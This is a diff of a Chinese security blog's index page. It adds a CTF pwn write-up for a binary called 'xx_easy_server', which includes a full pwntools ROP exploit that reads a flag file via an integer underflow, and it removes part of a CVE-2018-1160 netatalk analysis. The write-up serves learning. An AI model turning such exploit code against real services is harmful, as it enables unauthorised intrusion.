@@ -148,6 +148,90 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/16/xx_easy_server/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/violin.jpg">
+      <meta itemprop="name" content="fruit">
+      <meta itemprop="description" content="问灵十三载，等一不归人  欢迎交流：3209820155qq 添加备注：blog">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Fruit's Blogs">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/06/16/xx_easy_server/" class="post-title-link" itemprop="url">不知道来源哪里的pwn题</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-06-16 16:48:18" itemprop="dateCreated datePublished" datetime="2021-06-16T16:48:18+08:00">2021-06-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-07-10 10:06:36" itemprop="dateModified" datetime="2021-07-10T10:06:36+08:00">2021-07-10</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>先恢复一下符号表</p>
+<p>objdump -R xx_easy_server</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">str1 &#x3D; &#39;&#39;&#39;0804c768 R_386_JUMP_SLOT   strstr@GLIBC_2.0</span><br><span class="line">0804c76c R_386_JUMP_SLOT   strcmp@GLIBC_2.0</span><br><span class="line">0804c770 R_386_JUMP_SLOT   strcspn@GLIBC_2.0</span><br><span class="line">0804c774 R_386_JUMP_SLOT   fgets@GLIBC_2.0</span><br><span class="line">0804c778 R_386_JUMP_SLOT   fclose@GLIBC_2.1</span><br><span class="line">0804c77c R_386_JUMP_SLOT   time@GLIBC_2.0</span><br><span class="line">0804c780 R_386_JUMP_SLOT   alarm@GLIBC_2.0</span><br><span class="line">0804c784 R_386_JUMP_SLOT   fwrite@GLIBC_2.0</span><br><span class="line">0804c788 R_386_JUMP_SLOT   fread@GLIBC_2.0</span><br><span class="line">0804c78c R_386_JUMP_SLOT   strcpy@GLIBC_2.0</span><br><span class="line">0804c790 R_386_JUMP_SLOT   malloc@GLIBC_2.0</span><br><span class="line">0804c794 R_386_JUMP_SLOT   strftime@GLIBC_2.0</span><br><span class="line">0804c798 R_386_JUMP_SLOT   strchr@GLIBC_2.0</span><br><span class="line">0804c79c R_386_JUMP_SLOT   strlen@GLIBC_2.0</span><br><span class="line">0804c7a0 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804c7a4 R_386_JUMP_SLOT   fprintf@GLIBC_2.0</span><br><span class="line">0804c7a8 R_386_JUMP_SLOT   strcasecmp@GLIBC_2.0</span><br><span class="line">0804c7ac R_386_JUMP_SLOT   __isoc99_sscanf@GLIBC_2.7</span><br><span class="line">0804c7b0 R_386_JUMP_SLOT   setvbuf@GLIBC_2.0</span><br><span class="line">0804c7b4 R_386_JUMP_SLOT   fopen@GLIBC_2.1</span><br><span class="line">0804c7b8 R_386_JUMP_SLOT   gmtime@GLIBC_2.0</span><br><span class="line">0804c7bc R_386_JUMP_SLOT   memset@GLIBC_2.0</span><br><span class="line">0804c7c0 R_386_JUMP_SLOT   snprintf@GLIBC_2.0</span><br><span class="line">0804c7c4 R_386_JUMP_SLOT   strncpy@GLIBC_2.0</span><br><span class="line">0804c7c8 R_386_JUMP_SLOT   fileno@GLIBC_2.0</span><br><span class="line">0804c7cc R_386_JUMP_SLOT   strncasecmp@GLIBC_2.0</span><br><span class="line">0804c7d0 R_386_JUMP_SLOT   vfprintf@GLIBC_2.0</span><br><span class="line">0804c7d4 R_386_JUMP_SLOT   atoi@GLIBC_2.0</span><br><span class="line">0804c7d8 R_386_JUMP_SLOT   strncmp@GLIBC_2.0</span><br><span class="line">0804c7dc R_386_JUMP_SLOT   strspn@GLIBC_2.0</span><br><span class="line">0804c7e0 R_386_JUMP_SLOT   strncat@GLIBC_2.0&#39;&#39;&#39;</span><br><span class="line">lists &#x3D; str1.split(&#39;\n&#39;)</span><br><span class="line">func_list &#x3D; []</span><br><span class="line">for i in lists:</span><br><span class="line">    func_list.append(i.split(&#39;   &#39;)[1].split(&#39;@&#39;)[0] + &#39;_5&#39;)</span><br><span class="line">print(func_list)</span><br><span class="line"></span><br><span class="line">start_addr &#x3D; 0x08048750</span><br><span class="line">end_addr &#x3D; 0x8048930</span><br><span class="line">i &#x3D; start_addr</span><br><span class="line"></span><br><span class="line">while(i&lt;&#x3D;end_addr):</span><br><span class="line">    idc.set_name(i, func_list[int((i-0x08048750)&#x2F;0x10)])</span><br><span class="line">    i +&#x3D; 0x10</span><br></pre></td></tr></table></figure>
+
+<p>以前没逆过这种类型的  如果逆过就很快了   就是一个http_server服务</p>
+<p>进到核心函数里面</p>
+<p><img src="/2021/06/16/xx_easy_server/themes\blog\source_posts\xx_easy_server\image-20210617153215119.png" alt="image-20210617153215119"></p>
+<p>这个memory[xxxx]  就是栈中的数据，  但是我恢复不了  凑合着也能看</p>
+<p>首先输入一个post/get  /xxx(目录名字)  xxx的形式  </p>
+<p>再循环输入xxxx（content length host 之类的信息）</p>
+<p>再看其中的一些处理过程</p>
+<p><img src="/2021/06/16/xx_easy_server/themes\blog\source_posts\xx_easy_server\image-20210617153907518.png" alt="image-20210617153907518"></p>
+<p>漏洞点：</p>
+<p>9998-len  如果len &gt; 9998 就变成了负数   我虽然是个pwn新手  这种类型的没见过几次  但也略有感觉   似乎在某个oj中遇到过</p>
+<p><img src="/2021/06/16/xx_easy_server/themes\blog\source_posts\xx_easy_server\image-20210617154102824.png" alt="image-20210617154102824"></p>
+<p>exp：（参考了别人的，不过最终是懂了）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf<span class="number">-8</span> -*-</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">elf = ELF(&#x27;.xx_easy_server&#x27;)</span><br><span class="line">p = process(&#x27;.xx_easy_server&#x27;)</span><br><span class="line"><span class="meta">#bss =</span></span><br><span class="line"><span class="meta"># post /aaa.html aaaaaa</span></span><br><span class="line"><span class="meta"># leave : mov esp, ebp; pop ebp;</span></span><br><span class="line">#</span><br><span class="line">main_addr = <span class="number">0x080491EB</span></span><br><span class="line">fwrite_plt = <span class="number">0x80487C0</span></span><br><span class="line">fwrite_got = <span class="number">0x804C028</span></span><br><span class="line">ret = <span class="number">0x08048722</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08049a8b</span></span><br><span class="line">pppp_ret = <span class="number">0x08049a88</span> <span class="meta">#pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#x27;</span></span><br><span class="line">ppp_ret = <span class="number">0x08049a89</span></span><br><span class="line">leave_ret = <span class="number">0x080489b8</span></span><br><span class="line">snprintf_plt = <span class="number">0x080488B0</span></span><br><span class="line">fmt_s = <span class="number">0x8049ab9</span> #<span class="string">&quot;%s\n&quot;</span></span><br><span class="line">char_dot = <span class="number">0x8048431</span> #<span class="string">&quot;.&quot;</span></span><br><span class="line">char_sep = <span class="number">0x8049f19</span> #<span class="string">&quot;/&quot;</span></span><br><span class="line">char_f = <span class="number">0x8048490</span> #<span class="string">&quot;f&quot;</span></span><br><span class="line">char_l = <span class="number">0x8049d9b</span> #<span class="string">&quot;l&quot;</span></span><br><span class="line">char_a = <span class="number">0x8049f10</span> #<span class="string">&quot;a&quot;</span></span><br><span class="line">char_g = <span class="number">0x8048489</span> #<span class="string">&quot;g&quot;</span></span><br><span class="line">target_addr = <span class="number">0x804C695</span></span><br><span class="line">data_do_file = <span class="number">0x804c4d0</span></span><br><span class="line">p2p = <span class="number">0x804db7c</span>  #.data  begin   why?????????? ida直接search  立即数   <span class="number">0x804c0a0</span></span><br><span class="line">target_stack = <span class="number">0x804CA32</span>#<span class="number">0x804C0C7</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># snprintf(target, length, fmt, src)</span></span><br><span class="line">def rop_write_to(target, src, length, fmt):</span><br><span class="line">    rop = p32(snprintf_plt) + p32(pppp_ret)</span><br><span class="line">    rop += p32(target) + p32(length) + p32(fmt) + p32(src)</span><br><span class="line">    <span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rop_write_char_to(target, <span class="keyword">char</span>):</span><br><span class="line">    <span class="keyword">return</span> rop_write_to(target, <span class="keyword">char</span>, <span class="number">2</span>, fmt_s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rop_write_addr_to(target, ptr2addr):</span><br><span class="line">    <span class="keyword">return</span> rop_write_to(target, ptr2addr, <span class="number">5</span>, fmt_s)</span><br><span class="line">payload = p32(<span class="number">0xdeadbeef</span>)*(<span class="number">0xea68</span><span class="comment">//4) + p32(0)# padding + len( = [ebp-0x48])</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xea9c</span>, b<span class="string">&quot;B&quot;</span>)  #</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">bypass these</span><br><span class="line">.text:<span class="number">080499</span>C0                 mov     eax, [ebp<span class="number">-14</span>h]</span><br><span class="line">.text:<span class="number">080499</span>C3                 mov     eax, [eax+<span class="number">10</span>h]</span><br><span class="line">.text:<span class="number">080499</span>C6                 mov     edx, ds:dword_804C690</span><br><span class="line">.text:<span class="number">080499</span>CC                 sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">080499</span>CF                 push    edx</span><br><span class="line">.text:<span class="number">080499</span>D0                 lea     edx, [ebp<span class="number">-111</span>C0h]</span><br><span class="line">.text:<span class="number">080499</span>D6                 push    edx</span><br><span class="line">.text:<span class="number">080499</span>D7                 call    eax</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload += p32(<span class="number">0x0804c4d8</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xeab4</span>, b<span class="string">&quot;C&quot;</span>)</span><br><span class="line"><span class="meta">#payload += rop_write_addr_to(target_addr,</span></span><br><span class="line">#fopen(&#x27;./flag&#x27;,&quot;r&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += rop_write_addr_to(target_stack - <span class="number">0xc</span>, data_do_file)  <span class="meta"># copy do_file() addr</span></span><br><span class="line">payload += rop_write_addr_to(target_stack - <span class="number">0x4</span>, p2p)  <span class="meta"># copy filename addr</span></span><br><span class="line">payload += rop_write_addr_to(target_stack, <span class="number">0x804c684</span>)  <span class="meta"># copy stdout addr</span></span><br><span class="line">payload += rop_write_char_to(<span class="number">0x804c0a0</span>, char_dot)</span><br><span class="line">payload += rop_write_char_to(<span class="number">0x804c0a0</span> + <span class="number">1</span>, char_sep)  <span class="meta"># construct filename</span></span><br><span class="line">payload += rop_write_char_to(<span class="number">0x804c0a0</span> + <span class="number">2</span>, char_f)</span><br><span class="line">payload += rop_write_char_to(<span class="number">0x804c0a0</span> + <span class="number">3</span>, char_l)</span><br><span class="line">payload += rop_write_char_to(<span class="number">0x804c0a0</span> + <span class="number">4</span>, char_a)</span><br><span class="line">payload += rop_write_char_to(<span class="number">0x804c0a0</span> + <span class="number">5</span>, char_g)</span><br><span class="line">payload += p32(pop_ebp_ret) + p32(target_stack - <span class="number">0x10</span>)  <span class="meta"># set new stack</span></span><br><span class="line">payload += p32(leave_ret)  <span class="meta"># migrate stack</span></span><br><span class="line"><span class="meta">#fwrite need stream.</span></span><br><span class="line"><span class="meta">#payload += p32(fwrite_plt) + p32(pppp_ret) + p32(0x8049AE0) + p32(1) + p32(0x19) + p32(0x0804C690)</span></span><br><span class="line"><span class="meta"># begin eip  ---  only use rop</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#print hex(len((payload)))</span></span><br><span class="line">gdb.attach(p , &#x27;b *0x08049a88\n&#x27;)</span><br><span class="line">p.sendline(&#x27;post /&#123;&#125;/ aaaa&#x27;.format(&#x27;a&#x27; * 0x2700))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;\n&#x27;</span>) #</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)<span class="meta">#file content  # 0xeb  len = 0x270f</span></span><br><span class="line">p.shutdown(direction = <span class="string">&quot;send&quot;</span>) <span class="meta"># send EOF</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>除了任意读  还可以泄露libc，然后通过libc库查看libc版本。</p>
+<p> 但是最后能不能进system我没试</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/06/glibc%E4%BD%8E%E7%89%88%E6%9C%AC%E5%88%B0%E9%AB%98%E7%89%88%E6%9C%AC%E5%88%87%E6%8D%A2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -231,7 +315,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/05/23/fuzzing%20book%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">fuzzing book读书笔记</a>
+            <a href="/2021/05/23/fuzzing%20book%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">fuzzing book读书笔记1</a>
         </h2>
 
         <div class="post-meta">
@@ -248,7 +332,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-05-24 15:28:37" itemprop="dateModified" datetime="2021-05-24T15:28:37+08:00">2021-05-24</time>
+                <time title="Modified: 2021-06-07 16:24:49" itemprop="dateModified" datetime="2021-06-07T16:24:49+08:00">2021-06-07</time>
               </span>
 
           
@@ -262,7 +346,9 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h4 id="fuzzing-architecture"><a href="#fuzzing-architecture" class="headerlink" title="fuzzing architecture"></a>fuzzing architecture</h4><p>runner classes</p>
+          <p>主要看了fuzzing book的介绍部分</p>
+<p>单纯的随机测试  发现bug会比较慢 甚至很慢  所以要提出一些改进措施。</p>
+<h4 id="fuzzing-architecture"><a href="#fuzzing-architecture" class="headerlink" title="fuzzing architecture"></a>fuzzing architecture</h4><p>runner classes</p>
 <p>fuzzer classes</p>
 <p>code coverage</p>
 
@@ -460,80 +546,6 @@
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>idapython的基本用法大概就这么多</p>
 <p>还有一张总结很到位的图<br><a target="_blank" rel="noopener" href="https://bbs.pediy.com/upload/attach/202006/671106_PWX5AQEFFSYYHVU.png">https://bbs.pediy.com/upload/attach/202006/671106_PWX5AQEFFSYYHVU.png</a></p>
 <p><img src="https://bbs.pediy.com/upload/attach/202006/671106_PWX5AQEFFSYYHVU.png#id=iMiFM&originHeight=180&originWidth=400&originalType=binary&status=done&style=none"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/24/cve-2018-1160/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/violin.jpg">
-      <meta itemprop="name" content="fruit">
-      <meta itemprop="description" content="问灵十三载，等一不归人  欢迎交流：3209820155qq 添加备注：blog">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Fruit's Blogs">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/24/cve-2018-1160/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-04-24 18:42:25" itemprop="dateCreated datePublished" datetime="2021-04-24T18:42:25+08:00">2021-04-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-05-05 11:46:32" itemprop="dateModified" datetime="2021-05-05T11:46:32+08:00">2021-05-05</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="cve-2018-1160分析"><a href="#cve-2018-1160分析" class="headerlink" title="cve-2018-1160分析"></a>cve-2018-1160分析</h3><p>该bug允许未经认证的远程攻击者覆盖某些结构数据,可以控制执行流并绕过身份认证。</p>
-<h5 id="源码方面"><a href="#源码方面" class="headerlink" title="源码方面"></a>源码方面</h5><p>netatalk – AFP(Apple Filing Protocol，AFP)的实现，  源码下载在SourceForge可以找到。</p>
-<p>如果阅读源码的话，你会发现大部分的<strong>网络服务程序一般采用主进程循环监听请求的方式，当请求到来时，服务端将为其fork出一个子进程用于处理相关请求</strong>。说白了就是main里面一个while(1)始终监听，当请求到来时，会使用fork函数生成一个子进程专门处理。</p>
-<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>来到main函数 /etc/afpd/main.c</p>
-<p>一开始设置了一些信号  接着进入while循环</p>
-<p><img src="/2021/04/24/cve-2018-1160/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210427224012016.png" alt="image-20210427224012016"></p>
-<p>configinit函数中 会初始化dsi结构体</p>
-<p><img src="/2021/04/24/cve-2018-1160/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210427224110986.png" alt="image-20210427224110986"></p>
-<p>初始化dsi-&gt;header</p>
-<p><img src="/2021/04/24/cve-2018-1160/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210427224414733.png"></p>
 
       
     </div>
